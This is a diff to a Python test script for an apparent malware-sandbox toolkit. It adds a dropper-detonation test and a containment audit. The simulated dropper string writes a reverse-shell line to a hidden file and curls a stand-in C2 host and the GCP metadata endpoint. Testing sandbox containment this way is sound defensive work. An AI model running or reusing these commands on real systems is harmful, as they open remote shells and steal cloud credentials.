@@ -18,11 +18,13 @@ sys.path.insert(0, str(Path(__file__).parent.parent))
 load_dotenv(Path(".env"), override=True)
 
 from installation_scripts.code_executor_factory import (
-    calculate_shannon_entropy,
     calculate_beaconing_jitter,
-    extract_payload_strings,
+    calculate_shannon_entropy,
     deobfuscate_xor_strings,
+    detonate_and_capture_forensics,
+    extract_payload_strings,
     validate_and_test_yara_rule,
+    verify_sandbox_containment,
 )
 
 
@@ -139,6 +141,42 @@ rule APT29_CozyBear_Stager_Beacon {{
     print(f"    - Target Matched: {verification['matches']}")
     print(f"    - Matched Rules: {verification['matched_rules']}")
     print(f"    - Matched Strings: {verification['matched_strings']}")
+
+    # -------------------------------------------------------------------------
+    # Test 5: Untrusted Dropper Detonation & Differential Forensics (04-secops Pattern)
+    # -------------------------------------------------------------------------
+    print("\n[TEST 5] Untrusted Dropper Detonation & Differential Forensics:")
+    simulated_dropper = """#!/bin/bash
+echo "[*] Initializing dropper payload..."
+mkdir -p .hidden_beacon
+echo "MOCK_USER_DATA_LOCKED_2026" > user_data.lock
+echo "bash -i >& /dev/tcp/198.51.100.1/4444 0>&1" > .hidden_beacon/backdoor.sh
+chmod +x .hidden_beacon/backdoor.sh
+echo "[*] Attempting C2 beacon to 198.51.100.1..."
+curl -s --connect-timeout 2 http://198.51.100.1/beacon || echo "BEACON_BLOCKED"
+echo "[*] Attempting GCP Metadata credential access..."
+curl -s --connect-timeout 2 -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/ || echo "METADATA_ACCESS_BLOCKED"
+echo "[*] Dropper execution finished."
+"""
+    detonation_report = detonate_and_capture_forensics(simulated_dropper, payload_type="bash", timeout_sec=10)
+    print(f"  Execution Success: {detonation_report['execution_success']} (Exit code {detonation_report['exit_code']})")
+    print(f"  Execution Time: {detonation_report['execution_time_ms']} ms")
+    print(f"  C2 Beaconing Prevented: {detonation_report['c2_callbacks_prevented']}")
+    print(f"  GCP Metadata Theft Prevented: {detonation_report['metadata_theft_prevented']}")
+    print(f"  Dropped Artifacts Recovered: {detonation_report['dropped_files_count']}")
+    for artifact in detonation_report["dropped_artifacts"]:
+        print(f"    • {artifact['filename']} ({artifact['size_bytes']} bytes) | SHA-256: {artifact['sha256']}")
+        print(f"      Preview: {artifact['preview'][:80]}")
+
+    # -------------------------------------------------------------------------
+    # Test 6: Zero-Trust Containment Audit (01-hello-sandbox Security Probes)
+    # -------------------------------------------------------------------------
+    print("\n[TEST 6] Zero-Trust Sandbox Isolation & Credential Shielding Audit:")
+    containment_audit = verify_sandbox_containment()
+    print(f"  Overall Hardened Verdict: {containment_audit['verdict']}")
+    print(f"  Metadata Server Shielded: {containment_audit['metadata_shielded']} ({containment_audit['metadata_status']})")
+    print(f"  Host Environment Secrets Stripped: {containment_audit['env_credentials_shielded']}")
+    print(f"  External Outbound Egress Blocked: {containment_audit['egress_denied']} ({containment_audit['egress_status']})")
 
     print("\n" + "=" * 80)
     print("ALL REAL DATA TESTS COMPLETED SUCCESSFULLY!")
